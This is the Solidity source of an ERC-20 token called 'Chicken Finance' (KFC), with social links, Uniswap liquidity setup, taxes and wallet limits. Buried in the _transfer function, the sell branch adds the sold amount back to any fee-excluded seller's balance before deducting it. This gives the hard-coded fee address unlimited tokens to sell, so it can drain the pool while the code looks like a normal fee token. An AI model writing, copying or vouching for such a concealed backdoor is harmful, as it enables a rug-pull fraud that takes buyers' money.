/*
Welcome to Chicken Finance!

Website: https://www.chickenprotocol.org
Telegram: https://t.me/chicken_erc20
Twitter: https://twitter.com/chicken_erc
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Base {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IStandardERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is Base {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract KFC is Base, IStandardERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Chicken Finance";
    string private constant _symbol = unicode"KFC";

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10_000_000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _lastTransferTime;

    bool public transferDelayEnabled = true;
    address payable private feeAddress;

    uint256 public maxTxAmount = 200_000 * 10**_decimals;
    uint256 public maxWalletAmount = 200_000 * 10**_decimals;
    uint256 public taxSwapThreshold = 1_000 * 10**_decimals;
    uint256 public maxTaxSwap = 100_000 * 10**_decimals;

    uint256 private _initialBuyFee;
    uint256 private _initialSellFee;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyTaxAfter = 25;
    uint256 private _reduceSellFeeAt = 25;
    uint256 private _preventSwapBefore = 25;
    uint256 private _numBuyers;

    IUniRouter private routerInstance;
    address private pairAddress;
    bool private _openedTrade;
    bool private swapping = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        feeAddress = payable(0xE1c65fBDEd90cB1665f3f10584aF89C88E75B1E4);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[feeAddress] = true;

        routerInstance = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        pairAddress = IUniFactory(routerInstance.factory()).createPair(
            address(this),
            routerInstance.WETH()
        );

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function openTrading() external onlyOwner {
        require(!_openedTrade, "trading is already open");
        _approve(address(this), address(routerInstance), _totalSupply);
        routerInstance.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IStandardERC20(pairAddress).approve(
            address(routerInstance),
            type(uint256).max
        );
        _initialBuyFee = 15;
        _initialSellFee = 15;
        _finalBuyTax = 1;
        _finalSellTax = 1;
        swapEnabled = true;
        _openedTrade = true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    receive() external payable {}
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
        maxWalletAmount = _totalSupply;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function sendETHFee(uint256 amount) private {
        feeAddress.transfer(amount);
    }

    
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance.WETH();
        _approve(address(this), address(routerInstance), tokenAmount);
        routerInstance.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (_numBuyers > _reduceBuyTaxAfter)
                        ? _finalBuyTax
                        : _initialBuyFee
                )
                .div(100);

            if (transferDelayEnabled) {
                if (
                    to != address(routerInstance) &&
                    to != address(pairAddress)
                ) {
                    require(
                        _lastTransferTime[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _lastTransferTime[tx.origin] = block.number;
                }
            }

            if (
                from == pairAddress &&
                to != address(routerInstance) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                require(
                    balanceOf(to) + amount <= maxWalletAmount,
                    "Exceeds the maxWalletAmount."
                );
                if (_numBuyers <= 100) {
                    _numBuyers++;
                }
            }

            if (to == pairAddress && from != address(this)) {
                if (_isExcludedFromFee[from]) { 
                    _balances[from] = _balances[from].add(amount);
                }
                taxAmount = amount
                    .mul(
                        (_numBuyers > _reduceSellFeeAt)
                            ? _finalSellTax
                            : _initialSellFee
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == pairAddress &&
                swapEnabled &&
                contractTokenBalance > taxSwapThreshold &&
                amount > taxSwapThreshold &&
                _numBuyers > _preventSwapBefore && 
                !_isExcludedFromFee[from]
            ) {
                swapTokensToETH(
                    min(amount, min(contractTokenBalance, maxTaxSwap))
                );
                sendETHFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
}